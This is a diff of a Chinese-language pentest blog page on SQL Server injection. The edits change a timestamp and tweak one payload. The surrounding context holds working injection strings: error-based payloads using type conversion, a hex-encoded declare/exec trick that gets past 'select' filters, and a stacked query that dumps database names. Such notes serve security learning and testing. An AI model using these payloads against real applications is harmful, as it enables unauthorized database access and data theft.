@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/0.png">
 <meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/1.png">
 <meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/2.png">
-<meta property="og:updated_time" content="2018-08-23T04:43:14.000Z">
+<meta property="og:updated_time" content="2018-09-06T04:12:46.088Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL Server 划水水">
 <meta name="twitter:description" content="在实习的渗透测试项目中，遇到的数据库系统绝大部分是 SQL Server。也算是了解和熟悉 Mssql 的一个重要过程吧。 0x01 基础常用查询12345678910111213-- 查询所有的数据库名SELECT name FROM  master..sysdatabases WHERE name NOT IN ( &apos;master&apos;, &apos;model&apos;, &apos;msdb&apos;, &apos;tempdb&apos;, &apos;n">
@@ -227,7 +227,7 @@
 <p>彻底防御xp_cmdshell方法：修复sql注入漏洞、删除 xplog70.dll 组件</p>
 <h2 id="0x03-利用数据类型转换报错注入"><a href="#0x03-利用数据类型转换报错注入" class="headerlink" title="0x03 利用数据类型转换报错注入"></a>0x03 利用数据类型转换报错注入</h2><ul>
 <li>and 可用：<code>?key=aa&#39;+and+db_name()&gt;1</code></li>
-<li>and 不可用：<code>?key=&#39;%2buser()^1</code></li>
+<li>and 不可用：<code>?key=&#39;%2buser^1</code></li>
 <li>convert 转换类型：<code>?key=a&#39;%2b(convert(int, @@version))</code></li>
 </ul>
 <h2 id="0x04-Tricks"><a href="#0x04-Tricks" class="headerlink" title="0x04 Tricks"></a>0x04 Tricks</h2><h3 id="set-绕过-select-过滤"><a href="#set-绕过-select-过滤" class="headerlink" title="set 绕过 select 过滤"></a>set 绕过 select 过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">; <span class="keyword">dEcLaRe</span> @s <span class="built_in">vArChAr</span>(<span class="number">8000</span>) <span class="keyword">sEt</span> @s=<span class="number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> eXeC(@s)<span class="comment">-- -</span></div></pre></td></tr></table></figure>
@@ -244,6 +244,7 @@
 <p><img src="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/2.png" alt=""></p>
 <p>可爆出任意数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?appSysCode=a&apos;%3bSELECT+name+FROM+master..sysdatabases+where+name%5e1%3e0+and+name+NOT+IN+(&apos;master&apos;,&apos;model&apos;,&apos;msdb&apos;,&apos;tempdb&apos;,&apos;northwind&apos;,&apos;pubs&apos;)--+-</div></pre></td></tr></table></figure>
+
       
 
       
